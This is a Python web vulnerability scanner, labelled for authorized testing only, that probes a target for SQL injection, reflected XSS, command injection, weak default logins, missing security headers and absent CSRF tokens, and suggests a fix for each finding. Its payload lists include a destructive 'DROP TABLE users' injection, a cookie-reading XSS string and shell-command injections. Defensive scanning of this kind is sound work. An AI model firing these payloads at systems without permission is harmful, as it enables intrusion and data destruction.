import os
import time
import pyfiglet
import platform
import requests
import argparse
import re
import sys
from datetime import datetime
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup as bs

# ─── ANSI Color Codes ────────────────────────────────────────────────────────
class Color:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    CYAN    = "\033[96m"
    BOLD    = "\033[1m"
    RESET   = "\033[0m"

def c(color, text):
    """Wrap text in ANSI color codes."""
    return f"{color}{text}{Color.RESET}"

# ─── Session Setup ────────────────────────────────────────────────────────────
session = requests.Session()
session.headers["User-Agent"] = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/83.0.4103.106 Safari/537.36"
)

# ─── URL Validation ───────────────────────────────────────────────────────────
def validate_url(url: str) -> bool:
    """Return True if url has a valid scheme and netloc."""
    try:
        parsed = urlparse(url)
        return parsed.scheme in ("http", "https") and bool(parsed.netloc)
    except Exception:
        return False

# ─── Form Helpers ─────────────────────────────────────────────────────────────
def get_all_forms(url: str, timeout: int) -> list:
    """Fetch all <form> elements from the given URL."""
    try:
        response = session.get(url, timeout=timeout)
        response.raise_for_status()
        soup = bs(response.content, "html.parser")
        return soup.find_all("form")
    except requests.RequestException as e:
        print(c(Color.RED, f"[ERROR] Could not fetch forms from {url}: {e}"))
        return []

def get_form_details(form) -> dict:
    """Extract action, method, and inputs from a form element."""
    action = form.attrs.get("action")
    action = action.lower() if action else None
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for tag in form.find_all("input"):
        inputs.append({
            "type":  tag.attrs.get("type", "text"),
            "name":  tag.attrs.get("name"),
            "value": tag.attrs.get("value", ""),
        })

    return {"action": action, "method": method, "inputs": inputs}

def submit_form(form_details: dict, base_url: str, value: str, timeout: int):
    """Submit a form with the given value injected into text fields."""
    target_url = urljoin(base_url, form_details["action"])
    data = {}

    for inp in form_details["inputs"]:
        if inp["type"] in ("text", "search"):
            inp["value"] = value

        name  = inp.get("name")
        val   = inp.get("value")
        if name and val:
            data[name] = val

    try:
        if form_details["method"] == "post":
            return session.post(target_url, data=data, timeout=timeout)
        else:
            return session.get(target_url, params=data, timeout=timeout)
    except requests.RequestException as e:
        print(c(Color.RED, f"[ERROR] Form submission failed: {e}"))
        return None

# ─── Vulnerability Checks ─────────────────────────────────────────────────────
def is_sql_vulnerable(response) -> bool:
    """Detect common SQL error strings in the response body."""
    if response is None:
        return False
    errors = {
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
    }
    body = response.content.decode(errors="replace").lower()
    return any(err in body for err in errors)

# ─── SQL Injection ────────────────────────────────────────────────────────────
SQL_PAYLOADS = [
    "' OR 1=1 --",
    "' OR 'a'='a",
    "1'; DROP TABLE users; --",
    "1' OR '1'='1' --",
    "') OR ('a'='a",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "') OR '1'='1--",
    "' OR '1'='1'--",
    "1 or 1=1 --",
    "1 or 1=1#",
    "1 union select 1,2,3--",
    "' UNION SELECT 1,2,3--",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
]

def scan_sql_injection(url: str, timeout: int) -> str:
    """Scan for SQL injection via URL params and form inputs."""
    lines = []
    found = False

    # Test URL parameters
    for payload in SQL_PAYLOADS:
        test_url = f"{url}?input={requests.utils.quote(payload)}"
        try:
            res = session.get(test_url, timeout=timeout)
            if is_sql_vulnerable(res):
                lines.append(c(Color.RED, f"[VULN] SQL Injection via URL param — payload: {payload}"))
                lines.append(c(Color.YELLOW, f"       URL: {test_url}"))
                lines.append(c(Color.GREEN,  "       Fix: Use parameterized queries / prepared statements."))
                found = True
                break
        except requests.RequestException as e:
            lines.append(c(Color.RED, f"[ERROR] Request failed: {e}"))

    # Test forms
    forms = get_all_forms(url, timeout)
    lines.append(c(Color.CYAN, f"[INFO] Found {len(forms)} form(s) on {url}"))

    for i, form in enumerate(forms):
        form_details = get_form_details(form)
        for payload in SQL_PAYLOADS:
            data = {}
            for inp in form_details["inputs"]:
                if not inp["name"]:
                    continue
                if inp["type"] == "hidden" or inp["value"]:
                    data[inp["name"]] = (inp["value"] or "") + payload
                elif inp["type"] != "submit":
                    data[inp["name"]] = f"test{payload}"

            form_url = urljoin(url, form_details["action"])
            try:
                if form_details["method"] == "post":
                    res = session.post(form_url, data=data, timeout=timeout)
                else:
                    res = session.get(form_url, params=data, timeout=timeout)

                if is_sql_vulnerable(res):
                    lines.append(c(Color.RED,    f"[VULN] SQL Injection in form #{i+1} — payload: {payload}"))
                    lines.append(c(Color.YELLOW,  f"       Action: {form_details['action']} | Method: {form_details['method']}"))
                    lines.append(c(Color.GREEN,   "       Fix: Use parameterized queries / prepared statements."))
                    found = True
                    break
            except requests.RequestException as e:
                lines.append(c(Color.RED, f"[ERROR] Form request failed: {e}"))

    if not found:
        lines.append(c(Color.GREEN, "[SAFE] No SQL Injection vulnerability detected."))

    return "\n".join(lines)

# ─── XSS ──────────────────────────────────────────────────────────────────────
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "'><script>alert('XSS')</script><'",
    "'';!--\"<XSS>=&{()}",
    "><svg/onload=alert('XSS')>",
    "'\"(){}:;><svg/onload=alert('XSS')>",
    "'\"/><svg/onload=alert('XSS')>",
    "'-alert(1)-'",
    "'-alert(1)//",
    "javascript:alert('XSS')",
    "<img src=x onerror=alert('XSS')>",
    "<img src='/' onerror='alert(\"XSS\")'/>",
    "'<script>alert(document.cookie)</script>",
]

def scan_xss(url: str, timeout: int) -> str:
    """Scan for reflected XSS via form inputs."""
    lines = []
    found = False
    forms = get_all_forms(url, timeout)
    lines.append(c(Color.CYAN, f"[INFO] Found {len(forms)} form(s) on {url}"))

    for i, form in enumerate(forms):
        form_details = get_form_details(form)
        for payload in XSS_PAYLOADS:
            res = submit_form(form_details, url, payload, timeout)
            if res is None:
                continue
            try:
                if payload in res.content.decode(errors="replace"):
                    lines.append(c(Color.RED,   f"[VULN] XSS in form #{i+1} — payload: {payload}"))
                    lines.append(c(Color.YELLOW,  f"       Action: {form_details['action']} | Method: {form_details['method']}"))
                    lines.append(c(Color.GREEN,   "       Fix: Sanitize/escape user input; use a CSP header."))
                    found = True
                    break
            except Exception:
                pass

    if not found:
        lines.append(c(Color.GREEN, "[SAFE] No XSS vulnerability detected."))

    return "\n".join(lines)

# ─── Remote Code Execution ────────────────────────────────────────────────────
RCE_PAYLOADS = [
    "system('ls');",
    "system('whoami');",
    "system('id');",
    "`ls`",
    "`whoami`",
    "$(whoami)",
    "$(id)",
    "; ls -la",
    "| whoami",
]

RCE_INDICATORS = ["root", "www-data", "total", "uid=", "gid="]

def remote_code_execution(url: str, timeout: int) -> str:
    """Check for basic RCE indicators in query-param responses."""
    lines = []
    found = False

    for payload in RCE_PAYLOADS:
        try:
            res = session.get(url, params={"input": payload}, timeout=timeout)
            body = res.text.lower()
            if any(ind in body for ind in RCE_INDICATORS):
                lines.append(c(Color.RED,   f"[VULN] Possible RCE — payload: {payload}"))
                lines.append(c(Color.GREEN,  "       Fix: Never pass user input to shell commands; use allowlists."))
                found = True
                break
        except requests.RequestException as e:
            lines.append(c(Color.RED, f"[ERROR] RCE request failed: {e}"))

    if not found:
        lines.append(c(Color.GREEN, "[SAFE] No Remote Code Execution vulnerability detected."))

    return "\n".join(lines)

# ─── Security Misconfiguration ────────────────────────────────────────────────
INSECURE_HEADERS = {
    "Server":       "Server version exposed",
    "X-Powered-By": "Framework/technology exposed",
}
MISSING_HEADERS = {
    "X-Frame-Options":        "Clickjacking protection missing",
    "X-Content-Type-Options": "MIME-sniffing protection missing",
    "Content-Security-Policy": "CSP header missing",
    "Strict-Transport-Security": "HSTS missing (HTTPS only)",
}

def security_misconfiguration(url: str, timeout: int) -> str:
    """Check for insecure or missing security-related HTTP headers."""
    lines = []
    found = False

    try:
        res = session.get(url, timeout=timeout)
        headers = res.headers

        for header, reason in INSECURE_HEADERS.items():
            if header in headers:
                lines.append(c(Color.RED,   f"[VULN] {reason} — {header}: {headers[header]}"))
                lines.append(c(Color.GREEN,  "       Fix: Remove or obscure this response header."))
                found = True

        for header, reason in MISSING_HEADERS.items():
            if header not in headers:
                lines.append(c(Color.YELLOW, f"[WARN] {reason} — {header} not set"))
                found = True

        # Check for insecure Set-Cookie
        if "Set-Cookie" in headers:
            cookie = headers["Set-Cookie"]
            if "httponly" not in cookie.lower() or "secure" not in cookie.lower():
                lines.append(c(Color.RED,  "[VULN] Cookie missing HttpOnly or Secure flag"))
                lines.append(c(Color.GREEN, "       Fix: Add HttpOnly; Secure flags to all cookies."))
                found = True

    except requests.RequestException as e:
        lines.append(c(Color.RED, f"[ERROR] Could not check headers: {e}"))

    if not found:
        lines.append(c(Color.GREEN, "[SAFE] No security misconfiguration detected."))

    return "\n".join(lines)

# ─── Broken Authentication ────────────────────────────────────────────────────
def broken_auth(url: str, timeout: int) -> str:
    """Send weak credentials and inspect response for auth issues."""
    lines = []
    weak_creds = [
        ("admin", "admin"),
        ("admin", "password"),
        ("test",  "test"),
        ("root",  "root"),
        ("user",  "user"),
    ]

    try:
        for username, password in weak_creds:
            res = session.post(url, data={"username": username, "password": password}, timeout=timeout)
            body = res.text.lower()
            cookies = res.cookies

            if "logout" in body or "dashboard" in body or "welcome" in body:
                lines.append(c(Color.RED,  f"[VULN] Weak credentials accepted — {username}:{password}"))
                lines.append(c(Color.GREEN, "       Fix: Enforce strong password policies; add account lockout."))
                return "\n".join(lines)

            if "session" in str(cookies).lower():
                lines.append(c(Color.RED,  "[VULN] Session cookie issued for weak credentials"))
                lines.append(c(Color.GREEN, "       Fix: Implement MFA and session expiry."))
                return "\n".join(lines)

        lines.append(c(Color.GREEN, "[SAFE] No broken authentication vulnerability detected."))

    except requests.RequestException as e:
        lines.append(c(Color.RED, f"[ERROR] Auth check failed: {e}"))

    return "\n".join(lines)

# ─── CSRF ─────────────────────────────────────────────────────────────────────
def csrf_scan(url: str, timeout: int) -> str:
    """Check for CSRF token absence in detected forms."""
    lines = []
    found = False
    forms = get_all_forms(url, timeout)

    for i, form in enumerate(forms):
        details = get_form_details(form)
        token_names = {"csrf", "token", "_token", "csrftoken", "authenticity_token"}
        input_names = {
            (inp.get("name") or "").lower()
            for inp in details["inputs"]
        }
        has_token = bool(token_names & input_names)

        if not has_token and details["method"] == "post":
            lines.append(c(Color.RED,  f"[VULN] No CSRF token in POST form #{i+1} — action: {details['action']}"))
            lines.append(c(Color.GREEN, "       Fix: Add a per-session CSRF token to all state-changing forms."))
            found = True

    if not found:
        lines.append(c(Color.GREEN, "[SAFE] No CSRF vulnerability detected (or no POST forms found)."))

    return "\n".join(lines)

# ─── Banner ───────────────────────────────────────────────────────────────────
def banner():
    banr = pyfiglet.figlet_format("W3B_SC4NN3R")
    print(c(Color.CYAN, banr))
    print(c(Color.BOLD, "  Web Vulnerability Scanner  |  For authorized testing only\n"))

# ─── Section Header ───────────────────────────────────────────────────────────
def section(title: str):
    width = 60
    bar = "─" * width
    print(f"\n{c(Color.BOLD, bar)}")
    print(c(Color.BOLD, f"  {title}"))
    print(c(Color.BOLD, bar))

# ─── Main ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    if platform.system() == "Linux":
        os.system("clear")
    elif platform.system() == "Windows":
        os.system("cls")

    banner()

    parser = argparse.ArgumentParser(
        description="W3B_SC4NN3R — Web vulnerability scanner",
        epilog="Example: python W3B_SC4NN3R.py https://example.com -t 5"
    )
    parser.add_argument("url",       help="Target URL (include http:// or https://)")
    parser.add_argument("-t", "--timeout", type=int, default=5,
                        help="Request timeout in seconds (default: 5)")
    parser.add_argument("--skip",    nargs="*", default=[],
                        choices=["sqli", "xss", "rce", "misconfig", "auth", "csrf"],
                        help="Modules to skip (e.g. --skip rce csrf)")
    args = parser.parse_args()

    if not validate_url(args.url):
        print(c(Color.RED, f"[ERROR] Invalid URL: '{args.url}'. Include http:// or https://"))
        sys.exit(1)

    target = args.url.rstrip("/")
    timeout = args.timeout
    skip = set(args.skip)
    start_time = datetime.now()

    print(c(Color.CYAN, f"[*] Target  : {target}"))
    print(c(Color.CYAN, f"[*] Timeout : {timeout}s"))
    print(c(Color.CYAN, f"[*] Started : {start_time.strftime('%Y-%m-%d %H:%M:%S')}"))

    # ── Run scans, collecting plain-text results for the report ──────────────
    ANSI_ESCAPE = re.compile(r"\033\[[0-9;]*m")

    def strip_ansi(text: str) -> str:
        return ANSI_ESCAPE.sub("", text)

    scans = [
        ("SQL Injection",          "sqli",      lambda: scan_sql_injection(target, timeout)),
        ("Cross-Site Scripting",   "xss",       lambda: scan_xss(target, timeout)),
        ("Remote Code Execution",  "rce",       lambda: remote_code_execution(target, timeout)),
        ("Security Misconfiguration", "misconfig", lambda: security_misconfiguration(target, timeout)),
        ("Broken Authentication",  "auth",      lambda: broken_auth(target, timeout)),
        ("CSRF",                   "csrf",      lambda: csrf_scan(target, timeout)),
    ]

    report_sections = {}

    for title, key, fn in scans:
        if key in skip:
            print(c(Color.YELLOW, f"\n[SKIP] {title}"))
            continue
        section(title)
        result = fn()
        print(result)
        report_sections[title] = strip_ansi(result)
        time.sleep(1)   # brief pause between modules

    # ── Generate report file ─────────────────────────────────────────────────
    end_time = datetime.now()
    elapsed  = (end_time - start_time).seconds

    output_file = re.sub(r"[^\w]", "_", target) + ".txt"
    output_path = os.path.join(os.path.dirname(__file__), output_file)

    with open(output_path, "w") as f:
        f.write("=" * 60 + "\n")
        f.write("  W3B_SC4NN3R — Vulnerability Report\n")
        f.write("=" * 60 + "\n")
        f.write(f"  Target  : {target}\n")
        f.write(f"  Started : {start_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"  Finished: {end_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"  Elapsed : {elapsed}s\n")
        f.write("=" * 60 + "\n\n")

        for title, content in report_sections.items():
            f.write(f"{'─' * 60}\n")
            f.write(f"  {title}\n")
            f.write(f"{'─' * 60}\n")
            f.write(content + "\n\n")

    section("Scan Complete")
    print(c(Color.GREEN, f"[*] Finished in {elapsed}s"))
    print(c(Color.GREEN, f"[*] Report saved → {output_path}"))
